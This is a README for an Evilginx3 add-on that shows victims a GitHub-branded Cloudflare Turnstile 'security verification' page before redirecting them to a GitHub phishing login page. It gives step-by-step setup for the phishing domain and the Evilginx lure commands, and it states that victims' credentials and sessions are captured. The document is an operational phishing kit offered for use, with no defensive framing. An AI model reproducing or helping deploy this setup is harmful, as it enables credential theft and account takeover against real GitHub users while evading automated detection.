# GitHub Turnstile Redirector

GitHub-branded Cloudflare Turnstile verification page for Evilginx3.

## What It Does

When a user visits your lure URL, they will first see a GitHub-branded security verification page. After Cloudflare Turnstile verifies they're human (invisible mode), they are automatically redirected to the actual phishing login page.

## Setup Instructions

### Step 1: Create Cloudflare Turnstile Site

1. Go to [Cloudflare Turnstile Dashboard](https://dash.cloudflare.com/?to=/:account/turnstile)
2. Click **"Add Site"**
3. Configure:
   - **Domain**: Your phishing domain (e.g., `www.your-phishing-domain.com`)
   - **Widget Mode**: **"Invisible"**
4. Copy the **Site Key**

### Step 2: Configure Redirector

1. Open `index.html`
2. Find `TURNSTILE_SITEKEY` (around line 209)
3. Replace `'YOUR_TURNSTILE_SITE_KEY'` with your Site Key
4. Save the file

### Step 3: Create and Configure Lure

```bash
# Create a lure
lures create github

# Get the lure ID (from 'lures' command output)
lures

# Assign redirector (replace <id> with actual ID)
lures edit <id> redirector github_turnstile

# Get the full URL
lures get-url <id>
```

**Example:**
```bash
lures create github
lures edit 0 redirector github_turnstile
lures get-url 0
```

## How It Works

1. User visits lure URL → Sees GitHub security verification page
2. Turnstile verifies → Invisible human verification
3. Auto-redirect → User sent to `/` where GitHub phishing page is served
4. Credentials captured → Evilginx3 logs the session

## Features

- GitHub dark theme styling
- Invisible Turnstile integration
- 3-second fallback redirect
- Mobile-responsive

## Troubleshooting

- **Not showing**: Check `lures` command shows redirector is set
- **Turnstile fails**: Verify Site Key matches Cloudflare dashboard
- **Redirect loop**: Ensure phishlet is enabled and configured
